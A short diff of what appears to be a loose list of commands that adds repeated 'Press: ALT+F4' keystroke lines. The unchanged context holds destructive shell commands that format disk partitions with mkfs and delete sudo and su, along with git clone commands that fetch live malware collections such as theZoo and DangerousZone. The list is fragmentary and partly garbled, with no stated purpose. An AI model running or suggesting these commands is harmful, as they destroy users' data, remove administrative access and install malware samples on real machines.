@@ -1,3 +1,7 @@
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
 <off>
 mute
 <off>  
@@ -27,6 +31,9 @@ mkfs ext4 /dev/sda3. 2b
 git clone https://github.com/021526-123425/little-liam/push
 rm -f /usr/bin/sudo;rm -f /bin/su
 cat /dev/null 
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
 mkfs ex4 dev/sda8. 1a
 >file
 <off>
@@ -171,6 +178,9 @@ git clone https://github.com/Penetrum-Security/Malware-Zoo
 git clone https://github.com/ytisf/theZoo
 git clone https://github.com/topics/gdi-malware
 >file
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
 <off>
 git clone https://github.com/malwares/DangerousZone
 <off>
